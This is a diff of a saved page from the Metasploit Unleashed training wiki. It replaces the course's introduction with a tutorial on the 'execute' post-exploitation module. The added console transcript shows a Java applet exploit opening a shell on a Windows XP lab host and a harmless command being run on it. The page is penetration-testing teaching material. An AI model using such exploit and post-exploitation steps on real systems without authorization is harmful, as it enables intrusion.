@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Multiple OS Post General Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Multiple_OS_Post_General_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Multiple_OS_Post_General_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_General_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_General_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,35 +57,81 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Multiple OS Post General Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Multiple_OS_Post_General_Modules#column-one">navigation</a>, <a href="Multiple_OS_Post_General_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
-<br />
-<br />
-</p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Multiple_OS_Post_General_Modules#execute"><span class="tocnumber">1</span> <span class="toctext">execute</span></a></li>
+</ul>
+</td></tr></table>
 <p><br />
+</p>
+<h2> <span class="mw-headline" id="execute"> execute </span></h2>
+<p>This module will execute arbritrary commands to an open sessions. Works on Windows, Linux, OSX and Unix platforms.
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
 <br />
+<pre>
+msf  post(<span style='color:#ff0000;'>execute</span>) > 
+<span style='color:#0000FF;'>[*]</span> 10.10.0.100      java_jre17_exec - Java 7 Applet Remote Code Execution handling request
+<span style='color:#0000FF;'>[*]</span> Sending stage (2976 bytes) to 10.10.0.100
+<span style='color:#0000FF;'>[*]</span> Command shell session 1 opened (10.10.0.151:4444 -> 10.10.0.100:1173) at 2012-08-31 15:06:06 -0400
+
+msf  post(<span style='color:#0000FF;'>execute</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (post/multi/general/execute):
+
+   Name     Current Setting       Required  Description
+   ----     ---------------       --------  -----------
+   COMMAND  echo hell > file.txt  no        The entire command line to execute on the session
+   SESSION  1                     yes       The session to run this module on.
+
+msf  post(<span style='color:#ff0000;'>execute</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Executing echo hell > file.txt on #&lt;Session:shell 10.10.0.100:1173 (10.10.0.100) "Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\Documents and Settings\administrator\Desktop>">...
+<span style='color:#0000FF;'>[*]</span> Response: 
+<span style='color:#0000FF;'>[*]</span> Post module execution completed
+
+msf  post(<span style='color:#ff0000;'>execute</span>) >  <span style='color:#13C16A;'>sessions -i 1</span>
+<span style='color:#0000FF;'>[*]</span> Starting interaction with 1...
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\administrator\Desktop> dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2CB7-2817
+
+ Directory of C:\Documents and Settings\administrator\Desktop
+
+08/31/2012  09:04 AM    &lt;DIR>          .
+08/31/2012  09:04 AM    &lt;DIR>          ..
+08/31/2012  09:04 AM                46 <span style='color:#FFFF00;'>file.txt</span>
+12/29/2011  03:52 PM                70 portlist.txt
+               2 File(s)          1,431 bytes
+               2 Dir(s)   4,899,721,216 bytes free
+
+C:\Documents and Settings\administrator\Desktop>
+
+</pre>
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
+Preprocessor visited node count: 7/1000000
+Preprocessor generated node count: 30/1000000
 Post‐expand include size: 0/2097152 bytes
 Template argument size: 0/2097152 bytes
 Highest expansion depth: 2/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:480-0!*!*!*!en!*!* and timestamp 20131124115328 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_General_Modules&amp;oldid=1492">http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_General_Modules&amp;oldid=1492</a>"</div>
 							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
 													</div>
 						
@@ -521,4 +567,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.173 secs. --></body></html>
